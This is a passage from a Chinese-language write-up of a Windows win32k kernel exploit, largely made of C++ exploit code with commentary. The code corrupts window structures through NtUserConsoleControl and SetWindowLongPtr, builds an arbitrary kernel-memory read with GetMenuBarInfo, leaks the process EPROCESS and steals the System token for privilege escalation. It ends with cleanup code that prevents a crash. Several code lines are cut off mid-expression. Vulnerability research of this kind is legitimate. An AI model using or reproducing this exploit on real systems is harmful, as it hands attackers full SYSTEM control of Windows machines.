        ULONG_PTR ChangeOffset = 0;
        ULONG_PTR ConsoleCtrlInfo[2] = { 0 };            // 参数长度为 0x10 字节
        ConsoleCtrlInfo[0] = (ULONG_PTR)g_hWnd[0];        // 参数信息的第一个 8 字节存放窗口句柄
        ConsoleCtrlInfo[1] = (ULONG_PTR)ChangeOffset;    // 第二个 8 字节对利用没有影响
        NTSTATUS ret1 = g_fNtUserConsoleControl(6, (ULONG_PTR)&ConsoleCtrlInfo, sizeof(ConsoleCtrlInfo));    // 功能 6
        // 现在窗口 0 重新在桌面堆申请了一片空间作为扩展内存，pExtraBytes 存储其相对于桌面堆基址的偏移
        dwpWnd0_to_pWnd1_kernel_heap_offset = *(ULONGLONG*)((PBYTE)g_pWnd[0] + 0x128);
        if (dwpWnd0_to_pWnd1_kernel_heap_offset pSelf
    *(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x28) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x200);    // unknown1
    *(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x8);        // rgItems
    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x28) + 0x2C) = 1;    // unknown1->cItems
    *(DWORD*)((PBYTE)g_pMyMenu + 0x40) = 1;        // unknown2
    *(DWORD*)((PBYTE)g_pMyMenu + 0x44) = 2;        // unknown3
    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58)) = 0x4141414141414141;  // rgItems->unknown，用到的时候再初始化 
    // 修改窗口 1 的 spMenu，同时泄露原 spMenu
    ULONG_PTR pSPMenu = SetWindowLongPtr(g_hWnd[1], GWLP_ID, (LONG_PTR)g_pMyMenu);
    // 调用 GetMenuBarInfo 时，tagWNDk.dwStyle 不能包含 WS_CHILD
    ululStyle &= ~0x4000000000000000L;
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  // 移除窗口 1 的 WS_CHILD 样式
EXP 中通过函数 ReadKernelMemoryQQWORD 封装任意地址读功能，参数 pAddress 为要读的地址 p，ululOutVal1 和
ululOutVal2 存储读出来的 16 字节，其中 `ululOutVal1 = *(__int64 *)p`，`ululOutVal2 =
*(__int64 *)(p + 8)`，实现如下：
    void ReadKernelMemoryQQWORD(ULONG_PTR pAddress, ULONG_PTR &ululOutVal1, ULONG_PTR &ululOutVal2)
    {
        MENUBARINFO mbi = { 0 };
        mbi.cbSize = sizeof(MENUBARINFO);
        RECT Rect = { 0 };
        GetWindowRect(g_hWnd[1], &Rect);    // 获取窗口 1 的 RECT 信息，用于计算读出的真实值
        *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58)) = pAddress - 0x40; // rgItems->unknown
        GetMenuBarInfo(g_hWnd[1], -3, 1, &mbi);    // 读取
        BYTE pbKernelValue[16] = { 0 };
        *(DWORD*)(pbKernelValue) = mbi.rcBar.left - Rect.left;        // 减去 Rect.left，创建窗口时，该值被指定为 0
        *(DWORD*)(pbKernelValue + 4) = mbi.rcBar.top - Rect.top;    // 减去 Rect.top，创建窗口时，该值被指定为 0
        *(DWORD*)(pbKernelValue + 8) = mbi.rcBar.right - mbi.rcBar.left;
        *(DWORD*)(pbKernelValue + 0xc) = mbi.rcBar.bottom - mbi.rcBar.top;
        ululOutVal1 = *(ULONG_PTR*)(pbKernelValue);            // 成功读出 pAddress 开始的 16 字节
        ululOutVal2 = *(ULONG_PTR*)(pbKernelValue + 8);
    }
至于为什么要减去那四个值，再来回顾一下 xxxGetMenuBarInfo 中是怎么赋值 mbi 的。
###  4.4 泄露进程 EPROCESS 地址
312 – 320 行使用了 **3.6.3 节** 第一种方法来泄露：
    ULONG_PTR ululValue1 = 0, ululValue2 = 0;
    // **(__int64 **)(*(__int64 *)(spMenu + 0x18) + 0x100) 为进程 EPROCESS 结构体地址
    ReadKernelMemoryQQWORD(pSPMenu + 0x18, ululValue1, ululValue2);
    ReadKernelMemoryQQWORD(ululValue1 + 0x100, ululValue1, ululValue2);
    ReadKernelMemoryQQWORD(ululValue1, ululValue1, ululValue2);
    ULONG_PTR pMyEProcess = ululValue1;
    std::coutActiveProcessLinks 链表，找到 System 进程，将其 Token 复制到当前进程：
    ULONG_PTR pSystemEProcess = 0;
    ULONG_PTR pNextEProcess = pMyEProcess;
    for (int i = 0; i ActiveProcessLinks.Flink 的值
        pNextEProcess = ululValue1 - g_dwEPROCESS_ActiveProcessLinks_offset;    // 减去 ActiveProcessLinks 字段在 EPROCESS 结构体中的偏移，得到下一个进程 EPROCESS 结构体首地址
        // 读取下一个进程 pid
        ReadKernelMemoryQQWORD(pNextEProcess + g_dwEPROCESS_UniqueProcessId_offset, ululValue1, ululValue2);
        ULONG_PTR nProcessId = ululValue1;
        if (nProcessId == 4) { // pid 为 4，说明找到了 System 进程
            pSystemEProcess = pNextEProcess;
            std::cout Token
            SetWindowLongPtr(g_hWnd[1], 0, (LONG_PTR)pSystemToken);  // 窗口 1 的 pExtraBytes 处于直接寻址模式
            SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)old);        // 还原 tagWNDk1.pExtraBytes 旧值
            break;
        }
    }
###  4.6 扫尾工作
350 – 374 行恢复了被修改的各结构体字段，防止蓝屏的发生：
    g_dwpWndKernel_heap_offset2 = *(ULONG_PTR*)((PBYTE)pWnd2 + g_dwKernel_pWnd_offset);    // tagWNDk2 相对于桌面堆基址的偏移
    ULONG_PTR dwpWnd0_to_pWnd2_kernel_heap_offset = *(ULONGLONG*)((PBYTE)g_pWnd[0] + 0x128);    // tagWNDk0 在桌面堆上的扩展内存相对于桌面堆基址的偏移
    if (dwpWnd0_to_pWnd2_kernel_heap_offset dwExtraFlag 的 0x800 属性，pExtraBytes 改回直接寻址模式
        DWORD dwFlag = *(ULONGLONG*)((PBYTE)pWnd2 + g_dwModifyOffsetFlag_offset);
        dwFlag &= ~0x800;
        SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffsetFlag_offset, dwFlag);
        // 在用户空间堆中申请一片空间来赋值 ptagWNDk2->pExtraBytes
        PVOID pAlloc = g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, g_dwMyWndExtra);
        SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pAlloc);
        // 还原 ptagWNDk1->spMenu 时，ptagWNDk1->dwStyle 需要带有 WS_CHILD 属性
        ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_pWnd[1] + g_dwExStyle_offset);
        ululStyle |= 0x4000000000000000L;
        SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);    // 为窗口 1 添加 WS_CHILD 样式
        // 使用 SetWindowLongPtr 自带功能（-12）还原 ptagWNDk1->spMenu